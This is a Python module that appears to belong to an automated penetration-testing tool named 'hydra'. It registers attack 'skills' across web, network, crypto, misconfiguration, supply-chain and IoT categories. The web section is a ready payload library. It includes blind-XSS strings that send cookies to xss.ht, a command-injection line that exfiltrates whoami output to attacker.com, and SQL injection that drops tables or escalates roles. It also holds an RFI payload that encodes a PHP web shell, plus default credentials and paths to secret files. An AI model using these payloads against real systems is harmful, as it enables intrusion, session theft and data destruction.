"""Extended Web + Network + Crypto + Misconfig skills."""
from hydra.skills import Skill, SkillCategory as C, Severity as S, ExploitHypothesis as EH

def _h(id,t,d,steps,sev=S.HIGH,cwe="",pay=None):
    return EH(id=id,title=t,description=d,test_steps=steps,severity=sev,cwe=cwe,payloads=pay or [])

def _sk(id,n,cat,d,sev,tags,heur,hyps,pay=None,chain=None,fw=None,rem=None,val=None):
    return Skill(id=id,name=n,category=cat,description=d,severity=sev,tags=tags,
        reasoning_heuristics=heur,exploit_hypotheses=hyps,payloads=pay or [],
        chain_to=chain or [],framework_associations=fw or [],remediation=rem or [],
        validation_rules=val or [],evidence_requirements=["http_response","reproduction_steps"])

def register_extended_web(reg):
    # ── XSS Blind ──
    reg.register(_sk("xss_blind","Blind XSS",C.WEB,
        "XSS that fires in admin/internal panels when admin views attacker-controlled data",
        S.CRITICAL,["xss","blind","owasp"],
        ["Inject XSS Hunter payloads in all input fields","Target support tickets, feedback forms, user-agent headers","Wait for out-of-band callback"],
        [_h("xss_b1","Blind XSS via support ticket","Payload stored and rendered in admin dashboard",
            ["Submit ticket with XSS Hunter payload","Monitor callback server","Capture admin cookies on fire"],
            S.CRITICAL,cwe="CWE-79",
            pay=['"><script src=//xss.ht></script>','<img src=x onerror="new Image().src=\'//xss.ht/\'+document.cookie">'])],
        pay=['"><script src=//yourxss.ht></script>','<img src=x onerror=fetch("//cb/"+document.cookie)>',
            '"><input onfocus=fetch("//cb/"+document.cookie) autofocus>'],
        chain=["session_hijack","account_takeover"],
    ))
    # ── XSS Mutation ──
    reg.register(_sk("xss_mutation","Mutation XSS (mXSS)",C.WEB,
        "Exploit browser HTML parser mutations to bypass sanitizers like DOMPurify",
        S.HIGH,["xss","mutation","mxss","sanitizer_bypass"],
        ["Test payloads that mutate during innerHTML assignment","Target DOMPurify, sanitize-html, bleach"],
        [_h("mxss1","mXSS via math/svg nesting","Browser re-parses nested tags creating executable context",
            ["Inject <math><mtext><table><mglyph><style>...","Check if browser mutates into script context"],
            cwe="CWE-79")],
        pay=['<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
    ))
    # ── SQLi Second-Order ──
    reg.register(_sk("sqli_second_order","Second-Order SQL Injection",C.WEB,
        "SQL payload stored in DB and triggered when read by a different query",
        S.CRITICAL,["sqli","second-order","stored"],
        ["Store payload in registration/profile","Trigger via password reset or admin view","Check for delayed SQL errors"],
        [_h("sqli_so1","Second-order via username","Malicious SQL stored in username triggers on admin query",
            ["Register with username: admin'--","Login and trigger profile lookup","Check for SQL error or auth bypass"],
            S.CRITICAL,cwe="CWE-89")],
        pay=["admin'--","' OR 1=1--","'); DROP TABLE users;--"],
    ))
    # ── SQLi Stacked Queries ──
    reg.register(_sk("sqli_stacked","Stacked Query SQL Injection",C.WEB,
        "Execute multiple SQL statements via semicolons for data exfil or modification",
        S.CRITICAL,["sqli","stacked","injection"],
        ["Test if semicolons are processed","Try INSERT/UPDATE after SELECT","Check for DBMS-specific stacking support"],
        [_h("sqli_st1","Stacked INSERT","Inject data via stacked INSERT after legitimate query",
            ["Inject '; INSERT INTO users(name,pass) VALUES('evil','evil');--","Verify new row created"],
            S.CRITICAL,cwe="CWE-89")],
        pay=["'; INSERT INTO log VALUES('pwned');--","'; UPDATE users SET role='admin' WHERE id=1;--"],
    ))
    # ── NoSQL Injection ──
    reg.register(_sk("nosqli","NoSQL Injection",C.WEB,
        "Inject operators into MongoDB/CouchDB queries to bypass auth or extract data",
        S.CRITICAL,["nosqli","injection","mongodb","nosql"],
        ["Test JSON body with $gt,$ne,$regex operators","Check for auth bypass with {$ne:null}","Try $where JS injection"],
        [_h("nosqli_auth","NoSQL auth bypass","Use $ne operator to bypass login",
            ["Send {username:{$ne:''},password:{$ne:''}}","Check if login succeeds","Extract users with $regex"],
            S.CRITICAL,cwe="CWE-943",
            pay=['{"username":{"$ne":""},"password":{"$ne":""}}','{"username":{"$regex":"^admin"},"password":{"$ne":""}}']),
         _h("nosqli_where","$where JS injection","Execute JavaScript via $where operator",
            ["Inject {$where:'sleep(5000)'}","Measure response delay"],
            S.CRITICAL,cwe="CWE-943")],
        pay=['{"$ne":""}','{"$gt":""}','{"$regex":".*"}','{"$where":"sleep(5000)"}'],
    ))
    # ── LDAP Injection ──
    reg.register(_sk("ldap_injection","LDAP Injection",C.WEB,
        "Inject LDAP filter expressions to bypass authentication or extract directory data",
        S.HIGH,["ldap","injection","directory"],
        ["Test * and () in login fields","Check for LDAP error messages","Try wildcard auth bypass"],
        [_h("ldap1","LDAP wildcard bypass","Bypass auth with * wildcard in username/password",
            ["Submit username=*&password=*","Check if login succeeds"],cwe="CWE-90")],
        pay=["*","*)(&","*)(uid=*))(|(uid=*","admin)(|(password=*"],
    ))
    # ── Command Injection ──
    reg.register(_sk("cmdi","OS Command Injection",C.WEB,
        "Inject OS commands via unsanitized user input passed to system calls",
        S.CRITICAL,["cmdi","rce","command_injection","owasp"],
        ["Test ; | && ` $() in parameters","Check for ping/nslookup functionality","Look for file operations accepting user input"],
        [_h("cmdi1","Semicolon command chain","Append command after semicolon",
            ["Inject ;id or ;whoami","Check response for command output","Try blind with sleep/ping"],
            S.CRITICAL,cwe="CWE-78",
            pay=[";id","|id","$(id)","`id`","&&id","||id",";cat /etc/passwd"])],
        pay=[";id","|id","$(id)","`id`",";sleep 5","&&cat /etc/passwd",
            "|nslookup attacker.com","$(curl attacker.com/$(whoami))"],
        chain=["data_exfil","lateral_movement"],
    ))
    # ── Path Traversal ──
    reg.register(_sk("path_traversal","Path Traversal",C.WEB,
        "Read arbitrary files by manipulating file path parameters",
        S.HIGH,["path_traversal","lfi","file_read"],
        ["Test ../ sequences in file parameters","Try null byte termination","Check URL encoding bypasses"],
        [_h("pt1","Classic dotdot-slash","Traverse directories with ../",
            ["Inject ../../etc/passwd","Check response for file contents","Try with encoding: %2e%2e%2f"],
            cwe="CWE-22")],
        pay=["../../etc/passwd","..\\..\\windows\\win.ini","....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd","..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd"],
    ))
    # ── RFI ──
    reg.register(_sk("rfi","Remote File Inclusion",C.WEB,
        "Include remote files via URL parameters to achieve RCE",
        S.CRITICAL,["rfi","inclusion","rce"],
        ["Check for include/require with user-controlled paths","Test with http:// URLs","Verify allow_url_include"],
        [_h("rfi1","Remote PHP inclusion","Include attacker-hosted PHP file",
            ["Inject http://evil.com/shell.txt as file param","Check for code execution"],
            S.CRITICAL,cwe="CWE-98")],
        pay=["http://evil.com/shell.txt","http://evil.com/shell.txt%00",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"],
    ))
    # ── HTTP Desync ──
    reg.register(_sk("http_desync","HTTP Desync Attack",C.WEB,
        "Exploit discrepancies in Transfer-Encoding/Content-Length parsing between proxies",
        S.CRITICAL,["desync","smuggling","http"],
        ["Send ambiguous CL/TE headers","Test CL.TE and TE.CL variants","Check for request splitting"],
        [_h("desync_clte","CL.TE desync","Frontend uses Content-Length, backend uses Transfer-Encoding",
            ["Send request with both CL and TE headers","Verify smuggled request reaches backend","Test for admin path access"],
            S.CRITICAL,cwe="CWE-444")],
        pay=["Transfer-Encoding: chunked\\r\\nContent-Length: 6\\r\\n\\r\\n0\\r\\n\\r\\nX"],
    ))

def register_network_skills(reg):
    for vid,n,d,cwe,pay in [
        ("dns_rebinding","DNS Rebinding","Bypass same-origin via DNS TTL manipulation","CWE-350",
         ["Rebind DNS to 127.0.0.1 after initial resolution"]),
        ("cors_misconfig","CORS Misconfiguration","Reflected or null origin with credentials allowed","CWE-942",
         ["Origin: https://evil.com","Origin: null"]),
        ("subdomain_takeover_skill","Subdomain Takeover","Claim orphaned CNAME records","CWE-913",
         ["Check for NXDOMAIN on CNAME targets","Register on hosting provider"]),
        ("tls_weakness","TLS/SSL Weakness","Weak ciphers, expired certs, or protocol downgrade","CWE-326",
         ["Test SSLv3/TLS1.0 support","Check for weak ciphers"]),
        ("dns_zone_transfer","DNS Zone Transfer","AXFR query reveals all DNS records","CWE-200",
         ["dig axfr @ns.target.com target.com"]),
        ("email_spoofing","Email Spoofing","Missing SPF/DKIM/DMARC allows email impersonation","CWE-290",
         ["Check SPF record","Check DMARC policy","Check DKIM selector"]),
        ("snmp_exposure","SNMP Exposure","Default community strings expose device info","CWE-798",
         ["Test community string: public","Test community string: private"]),
        ("smb_exposure","SMB/NetBIOS Exposure","Open SMB shares or null session access","CWE-200",
         ["smbclient -L //target -N","enum4linux target"]),
    ]:
        reg.register(_sk(vid,n,C.NETWORK,d,S.HIGH,[vid,"network"],
            [f"Test for {n}"],
            [_h(f"{vid}_1",n,d,[f"Execute {n} test"],cwe=cwe)],
            pay=pay))

def register_crypto_skills(reg):
    for vid,n,d,cwe in [
        ("weak_hash","Weak Hashing Algorithm","MD5/SHA1 used for passwords or integrity","CWE-328"),
        ("padding_oracle","Padding Oracle Attack","CBC padding errors leak plaintext","CWE-209"),
        ("ecb_detection","ECB Mode Detection","Identical plaintext blocks produce identical ciphertext","CWE-327"),
        ("weak_random","Weak Randomness","Predictable random values in tokens/IDs","CWE-330"),
        ("hardcoded_key","Hardcoded Encryption Key","Encryption keys embedded in source code","CWE-321"),
        ("hash_length_ext","Hash Length Extension","Extend MAC without knowing the key","CWE-328"),
        ("timing_attack","Timing Side-Channel","String comparison leaks info via response timing","CWE-208"),
    ]:
        reg.register(_sk(vid,n,C.CRYPTOGRAPHY,d,S.HIGH,[vid,"crypto"],
            [f"Test for {n}"],[_h(f"{vid}_1",n,d,[f"Execute {n} test"],cwe=cwe)]))

def register_misconfig_skills(reg):
    for vid,n,d,cwe,pay in [
        ("debug_enabled","Debug Mode Enabled","Production app running with debug/verbose errors","CWE-215",
         ["/.env","/_debugbar","/debug","/__debug__/","/_profiler"]),
        ("default_creds","Default Credentials","Default admin/admin or known vendor passwords","CWE-798",
         ["admin:admin","admin:password","root:root","test:test"]),
        ("dir_listing","Directory Listing","Web server exposes directory contents","CWE-548",
         ["/images/","/uploads/","/backup/","/assets/"]),
        ("backup_files","Backup File Exposure","Accessible .bak, .old, .swp, .sql files","CWE-530",
         ["/index.php.bak","/db.sql","/web.config.old","/.git/HEAD","/.svn/entries"]),
        ("admin_panel","Exposed Admin Panel","Admin interface accessible without VPN/IP restriction","CWE-306",
         ["/admin","/administrator","/wp-admin","/phpmyadmin","/manager","/console"]),
        ("security_headers","Missing Security Headers","No HSTS, CSP, X-Frame-Options, X-Content-Type","CWE-693",
         ["Check Strict-Transport-Security","Check Content-Security-Policy","Check X-Frame-Options"]),
        ("exposed_metrics","Exposed Metrics/Health","Prometheus/actuator/health endpoints public","CWE-200",
         ["/metrics","/actuator","/actuator/env","/health","/healthz","/_status"]),
        ("git_exposure","Git Repository Exposure","Accessible .git directory leaks source code","CWE-538",
         ["/.git/HEAD","/.git/config","/.git/logs/HEAD"]),
        ("svn_exposure","SVN Repository Exposure","Accessible .svn directory","CWE-538",
         ["/.svn/entries","/.svn/wc.db"]),
        ("env_exposure","Environment File Exposure","Accessible .env file with secrets","CWE-538",
         ["/.env","/.env.local","/.env.production","/.env.backup"]),
        ("server_info","Server Information Disclosure","Server version in headers or error pages","CWE-200",
         ["Check Server header","Check X-Powered-By header","Trigger 404/500 error pages"]),
        ("graphql_playground","GraphQL Playground Exposed","Interactive GraphQL IDE in production","CWE-200",
         ["/graphql","/graphiql","/playground","/altair","/voyager"]),
    ]:
        reg.register(_sk(vid,n,C.MISCONFIGURATION,d,S.MEDIUM,[vid,"misconfig","recon"],
            [f"Check for {n}"],[_h(f"{vid}_1",n,d,[f"Test {n}"],S.MEDIUM,cwe=cwe)],
            pay=pay))

def register_supply_chain_skills(reg):
    for vid,n,d,cwe in [
        ("typosquatting","Package Typosquatting","Register similar package names on public registries","CWE-427"),
        ("dep_confusion","Dependency Confusion","Public package overrides private with higher version","CWE-427"),
        ("lockfile_injection","Lockfile Injection","Modify lockfile to point to malicious package","CWE-829"),
        ("build_script_rce","Build Script RCE","Malicious postinstall/build scripts in packages","CWE-829"),
        ("compromised_maintainer","Compromised Maintainer","Hijacked package maintainer account","CWE-506"),
        ("pinning_absence","Unpinned Dependencies","No version pinning allows supply chain drift","CWE-1104"),
    ]:
        reg.register(_sk(vid,n,C.SUPPLY_CHAIN,d,S.CRITICAL,[vid,"supply_chain"],
            [f"Test for {n}"],[_h(f"{vid}_1",n,d,[f"Execute {n} test"],S.CRITICAL,cwe=cwe)]))

def register_iot_skills(reg):
    for vid,n,d,cwe in [
        ("firmware_extract","Firmware Extraction","Extract and analyze device firmware","CWE-798"),
        ("uart_debug","UART Debug Port","Exposed UART/JTAG debug interfaces","CWE-1191"),
        ("mqtt_unauth","MQTT Unauthenticated","MQTT broker without authentication","CWE-306"),
        ("coap_abuse","CoAP Protocol Abuse","Unprotected CoAP endpoints","CWE-306"),
        ("ble_sniffing","BLE Sniffing","Capture Bluetooth Low Energy traffic","CWE-319"),
        ("default_firmware_creds","Default Firmware Credentials","Vendor default passwords in firmware","CWE-798"),
    ]:
        reg.register(_sk(vid,n,C.IOT,d,S.HIGH,[vid,"iot","hardware"],
            [f"Test for {n}"],[_h(f"{vid}_1",n,d,[f"Execute {n} test"],cwe=cwe)]))

def register_all_extended(reg):
    """Register all extended skills into an existing registry."""
    register_extended_web(reg)
    register_network_skills(reg)
    register_crypto_skills(reg)
    register_misconfig_skills(reg)
    register_supply_chain_skills(reg)
    register_iot_skills(reg)
